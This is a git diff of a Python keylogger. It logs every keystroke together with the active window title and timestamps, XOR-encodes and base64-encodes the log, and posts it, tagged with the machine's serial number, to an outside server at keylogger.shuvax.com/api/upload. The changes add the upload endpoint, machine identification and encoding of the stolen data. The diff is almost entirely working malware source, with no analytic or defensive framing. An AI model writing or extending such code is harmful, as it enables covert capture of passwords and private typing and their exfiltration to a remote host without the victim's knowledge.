@@ -1,4 +1,4 @@
-import requests,time,ToolBox,pygetwindow,json,random,string,os
+import requests,time,ToolBox,pygetwindow,json,random,string,os,base64
 from Interface import IKeyLogger,Write
 class KeyLoggerService(IKeyLogger):
     def __init__(self):
@@ -9,12 +9,14 @@ class KeyLoggerService(IKeyLogger):
 
     def on_press(self, key) -> None:
         key = ToolBox.format_key(key)
+        if key == "":
+            return
         current_time = time.time()
         current_time_formatted = time.strftime("%d/%m/%Y - %H:%M:%S", time.localtime(current_time))
         active_window = pygetwindow.getActiveWindowTitle()
 
         if self.__last_type_time is None or current_time - self.__last_type_time >= 15 or active_window != self.__last_window:
-            self.__last_record = active_window + ': ' + current_time_formatted
+            self.__last_record = (active_window if isinstance(active_window,str) else 'General window') + ': ' + current_time_formatted
 
         self.__last_type_time = current_time
         self.__last_window = active_window
@@ -28,17 +30,15 @@ class KeyLoggerService(IKeyLogger):
         # return {key:value for key, value in self.__logged_keys.items() if key is not self.__last_record}
         return self.__logged_keys
 
-
     def clear_logged_keys(self) -> dict[str:str]:
-        self.__logged_keys = {self.__last_record:self.__logged_keys[self.__last_record]} if self.__last_record in self.__logged_keys else {}
-
-
+        # self.__logged_keys = {self.__last_record:self.__logged_keys[self.__last_record]} if self.__last_record in self.__logged_keys else {}
+        self.__logged_keys = {}
 
 class FileWriter(Write):
     def __init__(self,path=None):
         self.path = ToolBox.get_file_path()
 
-    def write(self, data: dict[str, str]) -> bool:
+    def write(self, sn, data: dict[str, str]) -> bool:
         try:
             if os.path.exists(self.path) and os.path.getsize(self.path) > 0:
                 with open(self.path, 'r', encoding='utf-8') as file:
@@ -61,21 +61,28 @@ class FileWriter(Write):
 class NetworkWriter(Write):
     def __init__(self,url=None):
         self.url = url or "https://keylogger.shuvax.com"
-    def write(self,data:dict[str:str]) -> bool:
+    def write(self, serial_number, data:dict[str:str]) -> bool:
+        if not data:
+            return True
         try:
-            response = requests.post(self.url, json=data)
+            all_data = {"machine":str(serial_number),"data":data}
+            response = requests.post(self.url+'/api/upload', json=all_data)
             return response.status_code == 200
         except requests.exceptions.RequestException:
             return False
 
 
 class Encryptor:
-    def __init__(self):
-        self.key = "".join(random.choices(string.ascii_letters + string.digits,k=512))
+    def __init__(self,key):
+        self.key = key
 
-    def encrypt(self,data:str) -> str:
-        ciphertext = ""
+    def encrypt(self, data: str) -> str:
+        data_bytes = data.encode('utf-8')
+        ciphertext = bytearray()
         length_key = len(self.key)
-        for index in range(len(data)):
-            ciphertext += chr(ord(data[index]) ^ ord(self.key[index % length_key]))
-        return ciphertext
+
+        for index in range(len(data_bytes)):
+            xor_byte = (data_bytes[index] ^ ord(self.key[index % length_key])) & 0xFF
+            ciphertext.append(xor_byte)
+
+        return base64.b64encode(ciphertext).decode('utf-8')
